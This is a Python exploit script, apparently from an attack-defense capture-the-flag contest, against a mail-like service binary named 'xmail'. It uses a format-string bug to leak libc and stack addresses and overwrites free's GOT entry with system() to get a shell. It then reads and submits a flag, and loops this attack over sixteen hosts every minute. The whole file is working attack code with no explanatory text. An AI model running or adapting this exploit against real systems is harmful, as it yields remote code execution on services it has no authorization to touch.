from threading import Thread
from libad import *
from time import sleep

import operator

from zio import *

target = ('119.254.101.197', 10000)
target = './xmail'
#target = ('10.0.17.1',9999)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)


def send_message(io, f_s):
    payload = '\x04DATA'
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    #io.read_until('end')
    payload = '['+f_s+';'
    payload = chr(len(payload))+payload
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    payload = '\x03.\r\n'
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    io.read_until('[')
    d = io.read_until(';')[:-1]
    return d



def do_fmt2(io, fmt):
    payload = '\x04DATA'
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    #io.read_until('end')
    payload = fmt
    payload = chr(len(payload))+payload
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    payload = 'aaa;sh\x00'
    payload = l8(len(payload))+payload
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    payload = '\x03.\r\n'
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)


def exp(target):
    io = zio(target, timeout=30, print_read=COLORED(NONE, 'red'), \
             print_write=COLORED(NONE, 'green'))
    #io.read_until('Token')
    #io.writeline('NxArhGPKLMmen9Y9QPePHSBbFqQPiqnU')
    io.read_until('?')
    io.writeline('S')

    d = int(send_message(io, '%63$p'), 16)

    libc_base = d - 0x0000000000020830

    print 'libc_base', hex(libc_base)
    system = libc_base + 0x0000000000045390
    binsh = libc_base + 0x000000000018CD17
    pop_rdi_ret = 0x0000000000402723

    stack = int(send_message(io, '%46$p'), 16)
    print 'stack', hex(stack)

    free_got = 0x00000000006040A8
    addr = l64(free_got)+l64(free_got+2)+l64(free_got+4)
    writes = {}
    writes[0] = system & 0xffff
    writes[1] = (system>> 16) & 0xffff
    writes[2] = (system>> 32) & 0xffff

    payload = 'aaa;sh;'
    printed = len(payload)
    for where, what in sorted(writes.items(), key=operator.itemgetter(1)):
        delta = (what - printed) & 0xffff
        if delta > 0:
            if delta < 8:
                payload += 'A' * delta
            else:
                payload += '%' + str(delta) + 'x'

        payload += '%' + str(14 + where) + '$hn'
        printed += delta

    payload = payload.ljust(48, 'a')
    payload += addr
    print len(payload)


    do_fmt2(io, payload)

    payload = '\x03sh;'
    io.write(l16(1)+l16(0)+l32(len(payload)+8))
    io.write(payload)
    io.writeline('echo 123')
    io.read_until('123\n')

    io.writeline('./bin/cat flag/flag')
    flag = io.readline()[:-1].strip()
    print target
    print 'flag', flag
    submit_flag(flag)
    io.close()

target = './xmail'
exp(target)
raw_input('pause')
ips = []
for i in range(1, 17):
    ips.append('172.16.' + str(i) + '.104')


while True:
    for ip in ips:
        try:
            target = (ip, 20004)
            print target
            exp(target)
        except:
            pass
    sleep(60)

